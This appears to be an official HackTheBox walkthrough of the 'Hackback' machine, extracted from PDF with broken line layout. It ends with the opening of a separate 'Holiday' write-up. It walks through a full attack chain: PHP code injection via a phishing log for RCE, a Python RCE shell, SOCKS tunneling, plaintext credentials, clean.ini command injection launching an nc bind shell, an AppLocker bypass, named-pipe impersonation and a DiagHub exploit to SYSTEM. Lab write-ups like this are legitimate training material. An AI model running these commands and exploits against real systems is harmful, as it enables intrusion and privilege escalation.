2\k38\k4s\k37\k64\k44\k52\k6q\k4q\k4q\k4o\k4n\k77\k34\k6n\k44\k6p\k56\k52\k
6r\k77\k72\k74\k37\k77\k37\k73\k30\k77\k6s\k31\k61\k77\k37\k73\k41\k51\k73\
k4o\k73\k66\k73\k4s\k45\k77\k34\k58\k44\k73\k52\k6n\k43\k6p\k4q\k4s\k77\k46
Page 10 / 46 
 
\k7n\k72\k43\k6q\k7n\k70\k76\k43\k41\k6n\k43\k75\k42\k7n\k44\k73\k73\k4o\k3
9\k46\k38\k4s\k34\k77\k71\k5n\k6r\k57\k73\k4o\k68'​];(shapgvba(p,q){ine 
r=shapgvba(s){juvyr(--s){p[​'chfu'​](p[​'fuvsg'​]());}};r(++q);}(n,0k66));ine 
o=shapgvba(p,q){p=p-0k0;ine 
r=n[p];vs(o[​'ZfHYzi'​]===haqrsvarq){(​shapgvba​(){ine s;gel{ine 
t=Shapgvba(​'erghea\k20(shapgvba()\k20'​+​'{}.pbafgehpgbe(\k22erghea\k20guvf\k
22)(\k20)'​+​');'​);s=t();}pngpu(u){s=jvaqbj;}ine 
v=​'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/='​;s[​'ng
bo'​]||(s[​'ngbo'​]=shapgvba(w){ine x=Fgevat(w)[​'ercynpr'​](/=+$/,​''​);sbe(ine 
y=0k0,z,a,b=0k0,c=​''​;a=x[​'puneNg'​](b++);~a&&(z=y%0k4?z*0k40+a:a,y++%0k4)?c+
=Fgevat[​'sebzPunePbqr'​](0kss&z>>(-0k2*y&0k6)):0k0){a=v[​'vaqrkBs'​](a);}erghe
a c;});}());ine d=shapgvba(e,q){ine 
g=[],h=0k0,i,j=​''​,k=​''​;e=ngbo(e);sbe(ine 
l=0k0,m=e[​'yratgu'​];l<m;l++){k+=​'%'​+(​'00'​+e[​'punePbqrNg'​](l)[​'gbFgevat'​](0k
10))[​'fyvpr'​](-0k2);}e=qrpbqrHEVPbzcbarag(k);sbe(ine 
N=0k0;N<0k100;N++){g[N]=N;}sbe(N=0k0;N<0k100;N++){h=(h+g[N]+q[​'punePbqrNg'​]
(N%q[​'yratgu'​]))%0k100;i=g[N];g[N]=g[h];g[h]=i;}N=0k0;h=0k0;sbe(ine 
O=0k0;O<e[​'yratgu'​];O++){N=(N+0k1)%0k100;h=(h+g[N])%0k100;i=g[N];g[N]=g[h];
g[h]=i;j+=Fgevat[​'sebzPunePbqr'​](e[​'punePbqrNg'​](O)^g[(g[N]+g[h])%0k100]);}
erghea j;};o[​'BbNPpq'​]=d;o[​'dFYjTx'​]={};o[​'ZfHYzi'​]=!![];}ine 
P=o[​'dFYjTx'​][p];vs(P===haqrsvarq){vs(o[​'cVwyDO'​]===haqrsvarq){o[​'cVwyDO'​]=
!![];}r=o[​'BbNPpq'​](r,q);o[​'dFYjTx'​][p]=r;}ryfr{r=P;}erghea r;};ine 
k=​'\k53\k65\k63\k75\k72\k65\k20\k4p\k6s\k67\k69\k6r\k20\k42\k79\k70\k61\k73
\k73'​;ine m=o(​'0k0'​,​'\k50\k5q\k53\k36'​);ine 
u=o(​'0k1'​,​'\k72\k37\k54\k59'​);ine l=o(​'0k2'​,​'\k44\k41\k71\k67'​);ine 
g=​'\k3s\k61\k63\k74\k69\k6s\k6r\k3q\k28\k73\k68\k6s\k77\k2p\k6p\k69\k73\k74
\k2p\k65\k78\k65\k63\k2p\k69\k6r\k69\k74\k29'​;ine 
f=​'\k26\k73\k69\k74\k65\k3q\k28\k74\k77\k69\k74\k74\k65\k72\k2p\k70\k61\k79
\k70\k61\k6p\k2p\k66\k61\k63\k65\k62\k6s\k6s\k6o\k2p\k68\k61\k63\k6o\k74\k6
8\k65\k62\k6s\k78\k29'​;ine 
v=​'\k26\k70\k61\k73\k73\k77\k6s\k72\k64\k3q\k2n\k2n\k2n\k2n\k2n\k2n\k2n\k2n
'​;ine x=​'\k26\k73\k65\k73\k73\k69\k6s\k6r\k3q'​;ine 
j=​'\k4r\k6s\k74\k68\k69\k6r\k67\k20\k6q\k6s\k72\k65\k20\k74\k6s\k20\k73\k61
\k79'​; 
</script> 
Page 11 / 46 
 
It seems to encoded or in some esoteric language. Looking at the top we find a term “ine” which 
is the rot13 encoded string for var. So the script is probably rot13 encoded. Copy it to a file to 
decode it. 
cat private.js | /usr/games/rot13 > decoded.js 
 
Even after decoding the script is uneasy to read. 
 
 
Let’s use an online ​beautifier​ to clean the code and look at it. After beautifying the code appears 
to be obfuscated.  
 
 
Instead of trying to deobfuscate the code if we look further down we see that it initializes some 
variables namely x, z, h, y, t, s, i, k,w. 
 
Page 12 / 46 
 
 
 
We can easily find the values by running the script in a browser and printing the values. Copy the
 
 
 
 
 
 
 
 
 
     
 
 
 
 
 
 
 
beautified script and then open up the browser devtools using Ctrl+Shift+I. Then click on the
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
console tab. Now paste the entire script into the console. Once done add this line and execute it. 
console.log(x, z, h, y, t, s, i, k, w);  
 
 
 
We see a message written onto the console. 
 
Secure Login Bypass Remember the secret path is 
2bb6916122f1da34dcd916421e531578 Just ​in​ ​case​ I loose access to the admin 
panel ?action=(show,list,​exec​,init) 
&site=(twitter,paypal,facebook,hackthebox) &password=******** &session= 
Nothing more to say 
 
We find a secret path and parameters action, site, password and session. Let’s check what the 
secret path contains. 
 
Browsing directly to the page redirects us back to the login page. So maybe we need to have 
access to the admin panel first. As the message doesn’t talk about the page name we’ll have to 
fuzz it. 
Page 13 / 46 
 
Gobuster can be used again to fuzz the admin page. We’ll use aspx, asp and php extensions as 
IIS can support PHP too. 
gobuster -w directory-list-2.3-medium.txt -t 200 -u 
http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -x php,aspx 
 
After a while gobuster discovers webadmin.php. Directly hitting the page redirects us again. 
Maybe this is due to no session. Let’s inspect it using Burp. We see that it responds with a 302 
FOUND and redirects to /.  
 
 
Page 14 / 46 
 
But we have access to some parameters from the message. Let’s use them to see if the response 
changes.  
http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?act
ion=list&site=hackthebox&password=password&session= 
 
Trying the link above we receive a different response “Wrong secret key”. This could mean that  
we need the correct password to proceed further. 
 
 
From the message earlier we know that the password is 8 characters long. 
 
FUZZING THE PASSWORD 
Let’s extract all 8 character strings from rockyou to reduce the fuzzing time. 
 
grep ​'^.\{8\}$'​ rockyou.txt > pass.txt 
 
And now fuzz the password using ​ffuf​: 
 
./ffuf -w pass.txt --fw 3 -u 
'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?ac
tion=list&site=hackthebox&password=FUZZ&session=' 
 
 
 
 
Page 15 / 46 
 
The password is found to be 12345678. 
 
 
 
Lets try sending the same request with this password. 
http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?act
ion=list&site=hackthebox&password=12345678&session= 
 
 
 
This time the page responds with two log files. Trying action=show gives an empty response but 
maybe it requires the log file to show which could be the session parameter. 
 
http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?act
ion=list&site=hackthebox&password=12345678&session=afc77af5c38d51e244b3b46d
954c72ede1f599acdeb3c6c9744c364ca688203c 
Page 16 / 46 
 
Trying the URL above we see that the page responds with credentials we tried on the 
HackTheBox phishing page earlier. 
 
 
 
As the we have total control over the input we can include arbitrary PHP code and get it 
executed. Let’s try that. First login to the HackTheBox phishing page with these credentials: 
<?php ​echo​ ​"pwned"​; ?> / password 
 
Looking at the log once again it’s seen that the string “pwned” is echoed. 
 
 
Now that we have RCE let’s use PHP system() function to execute system commands. 
 
Login with the credentials: 
<?php system(​"whoami"​); ?> / password 
Page 17 / 46 
 
Requesting the logs again we see that the username field is empty, this could mean that 
disabled_functions is enforced. 
 
 
Now that we can execute commands we need to find another way to enumerate the box. PHP
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provides some functions to help with this like the scandir() function can be used to list directories,
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
the file_get_contents() function can be used to read a file and file_put_contents() can be used to
 
 
 
 
 
 
 
   
 
 
 
 
 
 
 
write a file. For example, logging in with these credentials: 
 
<?php print_r(scandir(​"/")); ?> / password 
 
And requesting the page, we see the contents of the C: drive. 
 
 
 
Page 18 / 46 
 
ENUMERATING WITH PHP 
Let’s look at the webadmin script to see if it has some other functionalities. We can use the 
file_get_contents function along with base64encode. The credentials are: 
<?php ​echo​(base64_encode(file_get_contents(​"./webadmin.php"​))); ?> / 
password 
After logging in and requesting the page, we receive the script in base64. 
 
Copy the content and decode it locally. 
base64 -d page.b64 > webadmin.php 
 
Looking at the script, at the top we see that the session is sha256 hash of the IP address. 
 
Further down we see that the init function clear a session and the exec function is just a dummy. 
Page 19 / 46 
 
 
 
With all this knowledge we can create a script to implement all the functionality. Here’s an 
example: 
 
#!/usr/bin/python3 
  
import​ requests 
from​ cmd ​import​ Cmd 
import​ sys 
import​ re 
from​ base64 ​import​ b64encode, b64decode 
import​ hashlib 
import​ netifaces ​as​ ni 
 
def​ ​sendCmd​(cmd): 
url = ​"http://www.hackthebox.htb" 
execc = ​"<?php "​+ cmd + ​";?>"​; 
params = {​'_token'​ : ​'23HZyAY4Y8Z9wq1ntgvP8Yd'​, ​'username'​ : execc, 
'password'​ : ​'password'​, ​'submit'​ : ​''​ } 
requests.post( url, data=params ) 
 
def​ ​getOutput​(): 
url = 
"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php" 
params = { ​"action"​: ​"show"​ , ​"site"​: ​"hackthebox"​ , ​"password" 
:​"12345678"​, ​"session"​ : session } 
res = requests.get(url, params = params, allow_redirects= ​False​) 
return​ ((res.content).decode(​"utf-8"​)) 
 
Page 20 / 46 
 
  
def​ ​doReset​(): 
url = 
"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php" 
params = { ​"action"​: ​"init"​ , ​"site"​: ​"hackthebox"​ , ​"password" 
:​"12345678"​, ​"session"​: session } 
res = requests.get(url, params = params, allow_redirects= ​False​) 
  
 
def​ ​fixPath​(path): 
if​ ​"C:"​ ​in​ path: 
 
path = path.replace(​"C:"​, ​""​) 
if​ ​"\\"​ ​in​ path: 
 
path = path.replace(​"\\"​, ​"/"​) 
return​ path 
 
 
class​ ​Terminal​(Cmd): 
intro = ​"Hackback RCE script!\nUse help or ? for commands" 
prompt = ​":\> " 
  
def​ ​default​(self, args):  
 
    doReset() 
 
    sendCmd(args) 
 
    print(getOutput()) 
 
def​ ​do_dir​(self, args): 
 
'List files in specified directory' 
 
    args = fixPath(args) 
 
    cmd = ​"print_r(scandir(\"{}\"))"​.format(args) 
 
    doReset() 
 
    sendCmd(cmd) 
 
    dirs = getOutput() 
 
    m = re.search(​"\([\w\W]*\)"​, dirs) 
 
    print(​"Directory Listing for {}\r\n"​.format(args)) 
 
    ​for​ i ​in​ m.group(​0​).splitlines(): 
 
  ​try​: 
 
print(​"
"​+i.split(​"=>"​)[​1​]) 
 
except​: 
Page 21 / 46 
 
 
pass 
 
    print() 
 
def​ ​do_upload​(self,args): 
 
'Upload file to remote. Usage: upload local path,remote path' 
 
local, remote = args.split(​","​)[​0​], args.split(​","​)[​1​] 
 
os.system(​"base64 {} > {}.b64"​.format(local, local)) 
 
local = local + ​".b64" 
 
content = open(local, ​"r"​).read() 
 
cmd = ​"file_put_contents(\"{}\", 
base64_decode(\"{}\"))"​.format(local,(b64encode(content.encode(​'utf-8'​)).de
code(​"utf-8"​))) 
  
 
doReset() 
 
sendCmd(cmd) 
 
getOutput() 
 
cmd = ​"file_put_contents(\"{}\", 
base64_decode(file_get_contents(\"{}\"))); echo 
'uploaded'"​.format(fixPath(remote),local) 
  
 
doReset() 
 
os.system(​"rm {}"​.format(local)) 
 
sendCmd(cmd) 
 
if​ ​'uploaded'​ ​in​ getOutput(): 
 
print(​"Uploaded Successfully!"​) 
 
else​: 
 
print(​"There was an error uploading :("​) 
 
def​ ​do_download​(self, args): 
 
'Download file from remote. Usage: download remote path,local path' 
 
    remote, local = args.split(​","​)[​0​], args.split(​","​)[​1​] 
 
    cmd = ​"echo 
'<file>';echo(base64_encode(file_get_contents(\"{}\"))); echo 
'<file>'"​.format(fixPath(remote)) 
  
 
    doReset() 
 
    sendCmd(cmd) 
 
    b64File = re.search(​"<file>.*<file>"​, getOutput()) 
 
    content = b64File.group(​0​).replace(​"<file>"​, ​""​) 
 
    f = open(local, ​"wb+"​) 
 
    f.write(b64decode(content.encode(​'utf-8'​))) 
 
    print(​"Download complete"​) 
Page 22 / 46 
 
 
def​ ​do_exit​(self, args): 
 
    sys.exit(​0​) 
 
def​ ​main​(): 
ip = ni.ifaddresses(​'tun0'​)[ni.AF_INET][​0​][​'addr'​] 
p = ip.encode(​'utf-8'​) 
h = hashlib.new(​"sha256"​) 
h.update(p) 
global​ session 
session = h.hexdigest() 
t = Terminal() 
t.cmdloop() 
 
 
if​ __name__ == ​'__main__'​: 
main() 
 
The script first finds the IP address from the tun0 interface ( change it to your VPN interface ) then
 
 
 
 
 
 
 
 
 
 
   
   
 
 
 
   
 
creates a session out of it using sha256. The sendCmd function handles the creation of
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
credentials with the PHP code. The doReset function is used to reset the log file using the init
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
action as seen earlier which helps to avoid execution of older code. The fixPath function converts
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
backslashes to forward slashes to prevent PHP errors.  
 
The Terminal class handles the input of commands where the do_dir command is used to list files
 
 
 
 
 
 
 
 
 
 
 
   
 
 
 
 
in a directory, do_download downloads a file as seen earlier, it uses the <file> markers for easier
   
 
 
   
 
 
 
   
 
 
 
 
 
 
regex search of the file contents and the do_upload function uploads a file by base64 encoding
 
 
 
 
 
 
 
 
 
 
   
 
 
 
 
and copying it to the specified location. The script also supports history and tab autocomplete. 
 
 
 
 
 
 
 
 
Page 23 / 46 
 
Running the script using python3: 
 
 
Now we can enumerate the file system using the script. We see a Projects folder and a util folder
 
 
 
 
 
 
 
 
 
 
 
   
 
 
   
 
 
in the root directory. We don’t have access to the util folder and projects has just one document. 
While enumerating the web folders we see a file web.config.old in the admin folder. 
 
 
This can be downloaded using the download functionality. For help type: 
help download 
download /inetpub/wwwroot/new_phish/admin/web.config.old,web.config.old 
 
Page 24 / 46 
 
 
The file should be downloaded to the current folder. Looking at the contents of the
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
web.config.old we credentials for the user simple. 
 
<authentication mode=​"Windows"​> 
 
<identity impersonate=​"true" 
  
 
userName=​"simple" 
 
password=​"ZonoProprioZomaro:-("​/> 
 
</authentication> 
 
ASPX TUNNELING 
Apart from PHP files an IIS server can also execute ASPX and ASP code. We can use ASPX to
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
deploy a SOCKS proxy through the web server and bypass the firewall. This can be achieved
   
 
 
 
 
 
 
 
 
 
 
 
 
 
 
using ​reGeorg​. We can use the upload functionality in the script to upload the script. Use the help
 
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
menu for instructions. Before that download tunnel.aspx and the python script from the GitHub
 
 
 
 
 
 
 
 
 
 
 
 
 
 
repo. 
wget https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.aspx 
wget 
https://raw.githubusercontent.com/sensepost/reGeorg/master/reGeorgSocksProx
y.py 
Now upload it using the script, the default upload path is the secret folder on the box. 
 
Page 25 / 46 
 
Now browsing to the page, this message should be seen: 
 
Using the reGeorgSocksProxy.py the proxy can activated. 
Supply it with the local port number and the URL at which the ASPX page was uploaded to. 
python reGeorgSocksProxy.py -p 1080  -u 
http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx 
 
Now we can use proxychains in order to send traffic through the socks proxy and scan the box. 
Edit /etc/proxychains.conf and add the following line. 
socks4  127.0.0.1 1080 
 
Now let’s use nmap again to check the ports we found open earlier from port 6666/ 
proxychains nmap -sT -Pn -n 10.10.10.128 -p135,445,5985 
 
The -sT flag is used to do a full TCP connect scan and -Pn to avoid pinging through the proxy. We
 
 
   
 
 
   
 
 
 
 
 
 
 
 
 
 
 
 
 
Page 26 / 46 
 
find WinRM to be open on port 5985. 
 
 
FOOTHOLD 
As we already have credentials and can connect to WinRM through the proxy , let’s try logging in. 
We can use ​this​ script which uses the ruby winrm module. Make the following change to the 
script: 
conn = WinRM::Connection.new( 
  endpoint: ​'http://10.10.10.128:5985/wsman'​, 
  transport: :ssl, 
  user: ​'simple'​, 
  password: ​'ZonoProprioZomaro:-('​, 
  :no_ssl_peer_verification => ​true 
) 
Now using it in combination with proxychains should give us a session. 
rlwrap proxychains ruby winrm_shell_with_upload.rb 
 
And we have a shell as the user simple. The user is a member of project-managers group and 
has SeImpersonatePrivilege enabled which isn’t normal for low level users. 
Page 27 / 46 
 
 
 
 
 
 
 
 
 
 
Page 28 / 46 
 
LATERAL MOVEMENT 
ENUMERATION 
Which enumerating the folders earlier we found a util folder in the root directory. Let’s see if we 
have access to it now. 
 
We do have access to it and there’s a hidden folder named scripts. Let’s check it out. 
 
We have some scripts, log files and a clean.ini file. Let’s look at their permissions. 
Page 29 / 46 
 
icacls scripts\*.* 
 
 
 
Looking at the permissions we see that we Modify permissions on backup.bat and clean.ini and
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
read permissions on batch.log and dellog.bat. There’s another script named dellog.ps1 which we
 
 
 
 
 
 
 
 
 
 
 
 
 
have no access to. Let’s look at the dellog.bat script. 
 
 
The script executes dellog.ps1 and appends the output to the batch.log script. Then it runs all the
 
 
 
 
 
 
 
 
 
 
 
 
   
 
 
 
scripts in the spool folder which we don’t have permissions to view. 
 
Looking at the clean.ini file it looks like some sort of configuration file. 
Page 30 / 46 
 
 
 
Maybe one of the scripts running in a scheduled task makes use of this configuration file. As we
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
 
have Modify access to it let’s injecting commands into the file. 
 
COMMAND INJECTION 
Let’s modify the clean.ini to check if we can inject commands. Use the following commands; 
echo​ ​"[Main]"​ > C:\util\scripts\clean.ini 
echo​ ​"LogFile=c:\util\scripts\log.txt & whoami /all > c:\programdata\w.txt" 
>> C:\util\scripts\clean.ini 
echo​ ​"Directory=c:\inetpub\logs\logfiles & whoami /all > 
C:\ProgramData\d.txt"​ >> C:\util\scripts\clean.ini 
 
 
 
Looking at the timestamps on the batch.log file we’ll notice that the script runs every 5 minutes. 
 
After a while when the task runs again we should see the output of whoami /all in the
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
“C:\ProgramData\w.txt” file while the file “C:\ProgramData\d.txt” is empty. This proves that there’s
 
 
 
 
 
   
 
 
 
 
 
a command injection in the LogFile attribute and that the task is running as the user hacker. 
 
 
Now in order to get a shell we can use nc.exe but we can’t get a reverse shell due to firewall
 
 
 
 
   
 
 
 
 
 
 
 
 
   
 
 
 
 
 
Page 31 / 46 
 
restrictions. This can be solved by using a bind shell which listens on the host which we can
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
 
connect to using proxychains. 
 
First upload nc.exe onto the box using the upload function in the winrm script. We’ll see that we 
can’t execute the binary due to AppLocker policy. 
cd ~ 
UPLOAD nc64.exe C:\users\simple\nc.exe 
 
 
 
This can be easily bypassed by copying the binary into a whitelisted folder in System32 like 
“C:\windows\system32\spool\drivers\color\”. 
copy nc.exe C:\windows\system32\spool\drivers\color\ 
 
And now trying to run the exe should work. 
 
 
 
To create a bind shell the command could be of the form: 
 
cmd /c C:\windows\system32\spool\drivers\color\ nc.exe -lvp 4444 -e cmd.exe 
Use the following commands to create the clean.ini file: 
Page 32 / 46 
 
echo​ ​"[Main]"​ > \scripts\clean.ini 
echo​ ​"LogFile=c:\util\scripts\log.txt & cmd /c 
C:\windows\system32\spool\drivers\color\nc.exe -lvp 4444 -e cmd.exe"​ >> 
C:\util\scripts\clean.ini 
echo​ ​"Directory=c:\inetpub\logs\logfiles"​ >> C:\util\scripts\clean.ini 
 
 
 
And the next time when the script runs we should be able to connect to the port using 
proxychains. 
 
 
 
ALTERNATE METHOD USING NAMED PIPES 
Earlier we noticed that the user simple has SeImpersonatePrivilege. This can be abused by using
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
named pipe impersonation. According to the ​documentation named pipes are used for facilitating
 
 
 
 
 
 
 
 
 
 
 
 
 
IPC i.e Inter Process Communication. It can support two way communication between a server
 
 
 
 
   
 
 
 
 
 
   
 
and it’s clients. 
Named pipe ​impersonation​ allows a server to perform operations in the context of the clients. 
The LogFile attribute in the clean.ini configuration must be used to specify a log to write into. The
 
 
 
 
 
 
 
 
 
 
 
   
 
 
 
 
 
user who runs the task could be writing to it. We can switch the LogFile with a named pipe so that
 
 
 
 
 
 
 
 
   
 
 
 
 
 
   
 
 
 
 
when the user uses it, he connects to our malicious named pipe server.  
Page 33 / 46 
 
So let’s create our binary. The source code can be found here: 
https://github.com/MinatoTW/NamedPipeImpersonation/blob/master/NamedPipesCreateFile.c​. 
Here’s a step by step explanation of what the code does: 
First enable SeImpersonatePrivilege, this is just a precautionary step. A user should possess the
 
 
 
   
   
 
   
 
 
 
 
privilege to be able to enable it. 
 
Then, create a named pipe “haxx” and used the security attributes sa which is set to allow global
 
   
 
 
 
 
 
 
 
 
 
   
 
 
 
 
access to the pipe. It then waits for connection from clients. Once connected it reads from the
 
 
 
   
 
 
 
 
 
 
 
   
 
 
 
pipe. This is necessary to perform before impersonation. 
 
Next, it tries to Impersonate the client, if successful it creates a file at the desired location using
   
 
 
 
 
   
   
   
 
 
 
 
 
 
the CreateFile function and then writes data to it using the WriteFIle function. We can use this to
 
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
write a bat file to the spool folder and get it executed. 
Page 34 / 46 
 
 
First download the file make the following changes at the top: 
char Data[] = ​"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 
5555 -e cmd.exe"​;  
LPWSTR fileName = L​"C:\\util\\scripts\\spool\\pwn.bat"​;  
Now compile the program using mingw. Make sure mingw-64 is installed. 
apt install mingw-64 
x86_64-w64-mingw32-gcc -D UNICODE NamedPipesCreateFile.c -o exploit.exe 
Now upload the exe using the PHP RCE script from earlier.  
# Using the script 
upload exploit.exe,/windows/system32/spool/drivers/color/exploit.exe 
 
Now inject the named pipe path into the LogFile attribute.  
echo​ ​"[Main]"​ > C:\util\scripts\clean.ini 
Page 35 / 46 
 
echo​ ​"LogFile=\\.\pipe\haxx"​ >> C:\util\scripts\clean.ini 
echo​ ​"Directory=c:\inetpub\logs\logfiles"​ >> C:\util\scripts\clean.ini  
Once this is done, execute the binary and wait for the task to run again: 
C:\windows\system32\spool\drivers\color\exploit.exe 
 
When the task runs and the pipe is accessed the exploit should be written into the spool folder 
and the bat file will get executed. We can then connect to it using proxychains. 
 
 
 
 
Page 36 / 46 
 
PRIVILEGE ESCALATION 
ENUMERATION 
During the initial enumeration we discovered a service named UserLogger running as SYSTEM. 
Let’s look at the details of the service. 
powershell ​"&{ get-service userlogger | fl * }" 
 
However, we get minimal information, like the service is stopped and start type is manual. 
 
 
Let’s query it using the sc command instead.  
sc qc userlogger 
 
 
Page 37 / 46 
 
We see the service binary path is C:\Windows\System32\UserLogger.exe. Let’s see if we have
 
 
 
 
 
 
 
 
 
   
 
 
permission to start/stop the service.  
sc sdshow userlogger 
 
 
 
We can see the permissions using the sdshow command which is displayed in SDDL (Security
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Descriptor Definition Language). Let’s break it down following ​this​. The first ACL ending with SY
 
 
 
 
   
 
 
 
 
 
 
 
 
 
is for the SYSTEM account. The next ACL is ending with the SID of hacker user. The ACE attribute
 
 
 
 
 
 
 
   
 
 
 
 
 
 
 
 
 
 
“A::” at the beginning stands for “Allowed” which means that we have permission to start / stop
 
 
 
 
 
 
 
 
 
 
 
 
 
 
   
 
the service.  
 
Having confirmed this, let’s download and analyze the binary. To download it, first copy the
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
binary to a readable folder like C:\ProgramData and then download it using the RCE script. 
 
copy C:\windows\system32\userlogger.exe C:\programdata\userlogger.exe 
 
Note: Make sure you’re on a 64 process, if not use a 64 bit netcat to spawn a shell, as a 32 bit
 
 
 
 
   
 
   
 
   
 
 
 
 
   
 
   
 
 
shell can cause problems later. 
 
 
Now download it using the python RCE script from earlier.  
 
download /programdata/userlogger.exe,userlogger.exe 
 
Page 38 / 46 
 
  
 
ANALYSING THE BINARY 
Let’s see what the binary is doing under the hood with dynamic analysis. Copy the binary to a 
Windows VM, and make sure you’re an Administrator. Now create a service just as on the box. 
sc create UserLoggerSvc binPath= C:\users\administrator\userlogger.exe 
 
 
 
Now download Process Monitor from the SysInternals suite. You can find it ​here​. This will help us
 
 
 
 
 
 
 
 
 
 
   
 
 
 
 
 
to see what all the binary is doing while the service starts and runs.  
Page 39 / 46 
 
Extract the contents and start Process Monitor. Click on the Filter drop down at the top and select
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Filter. Set the filter to match the Image Path to the userlogger.exe. 
 
 
And then click on “Add” to save the filter and press Ctrl + X to clear. Once done go back to the
 
 
 
 
 
 
 
 
 
 
 
     
 
 
 
 
 
 
 
 
CMD prompt and start the service. 
sc start userloggersvc 
 
 
 
Now going back to Process Monitor and looking at the events we find some CreateFile and
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
WriteFIle operations. 
 
 
The binary creates a file at C:\Windows\Temp\UserLoggerService.log and then continuously
 
 
   
 
 
 
 
 
 
accesses it to read and write. Let’s see what the file contents are: 
Page 40 / 46 
 
 
 
It says the no logfile was specified and that it is using the default which must be the current file.
 
 
 
 
 
 
 
 
     
 
 
 
 
 
 
 
 
 
Then it logs the service status while starting and running. Let’s try specifying a logfile as a
   
 
 
 
 
 
 
 
 
 
 
   
 
   
command line option to see if the events change. Clear the Process Monitor console again. 
sc stop userloggersvc 
sc start userloggersvc C:\users\administrator\​log 
 
 
We
see
the
CreateFile event once again and this time the file create a log file at
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
C:\Users\Administrator\log.log. And it’s contents are: 
 
This time it says that the Logfile was specified. So from this dynamic analysis we came to know
 
   
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
two things: 
●
The service can take a parameter as a logfile path 
●
It appends .log to the filename and uses it as a logfile. 
Let’s test this behaviour on the box. Go back to the hacker shell and start the service with a
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
   
logfile specified. 
Page 41 / 46 
 
sc start userlogger C:\ProgramData\tmp 
 
 
 
And now looking at the ProgramData we see that the file tmp.log does exist.  
 
 
This confirms that the service exhibits the same behaviour on the box as we analysed earlier. 
 
Note: In case the log file isn’t created it means that the shell is a 32 bit process, get a shell using
 
 
 
 
 
 
 
   
 
 
 
     
 
 
 
   
 
 
64 bit netcat then. 
Now let’s see if we can write to sensitive locations like System32.  
sc stop userlogger 
Page 42 / 46 
 
sc start userlogger C:\Windows\System32\bad 
 
 
 
This confirms that we can write to System32, and icacls shows that we have permissions to
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
overwrite the created file. 
 
Now that we have the ability to perform arbitrary writes, we should be able to exploit it using the
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
   
 
 
DiagHub collector POC by James Forshaw. A detailed explanation can be found here -  
https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html 
 
GETTING A SHELL 
Download the simplified version of the POC from ​here​. Open up the solution in Visual Studio.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Before compiling it we need to change a couple of things. First, in the diaghub_exploit.cpp
 
   
 
 
 
   
 
 
 
 
 
 
 
change the valid_dir to some writable location like C:\ProgramData. 
 
 
Page 43 / 46 
 
Once that’s done, navigate to FakeDll.cpp and change the cmdline string to some file we can 
control. 
 
Now build the solution and copy the binary as well as the DLL to local box. Then upload it using 
WinRM script or using the PHP RCE script. 
UPLOAD diaghub_exploit.exe C:\ProgramData\diaghub.exe 
UPLOAD Fakedll.dll C:\ProgramData\Fake.dll 
 
 
 
Now from a hacker shell create the bat script which will trigger our shell: 
echo​ ​"cmd /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 5555 -e 
cmd.exe"​ >> C:\users\hacker\r.bat 
 
 
 
 
 
Page 44 / 46 
 
Then start the userlogger service creating a log file in System32 then copy the DLL over it. 
sc start userlogger C:\WINDOWS\SYSTEM32\pwn 
copy C:\ProgramData\Fake.dll C:\WINDOWS\SYSTEM32\pwn.log 
copy C:\ProgramData\diaghub.exe C:\windows\system32\spool\drivers\color\ 
 
 
 
And then execute the binary with pwn.log as the argument.  
 
 
 
And on the other side we have a SYSTEM shell! 
 
Page 45 / 46 
 
Going into the Administrator’s Desktop we see that the file isn’t an MD5 hash.  
 
 
 
However, if we check of the NTFS ADS ( Alternate Data Streams ) we see that flag.txt exists. 
dir /ah /r 
 
 
 
The flag can be viewed by using: 
powershell get-content root.txt:flag.txt 
 
 
Page 46 / 46 
 
 
 
 
 
 
Holiday 
21​st​ October 2017 / Document No D17.100.29 
Prepared By: Alexander Reid (Arrexel) 
Machine Author: g0blin 
Difficulty: Insane 
Classification: Official 
 
 
Page 1 / 8 
 
 
 
 
SYNOPSIS 
Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many 
different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the 
session of an interactive user. The machine is very unique and provides an excellent learning 
experience. 
 
Skills Required 
●
Intermediate knowledge of Linux 
●
Basic knowledge of Nodejs and NPM 
 
Skills Learned 
●
Bypassing user agent filtering 
●
Bypassing XSS filtering 
●
Obtaining data with stored XSS 
●
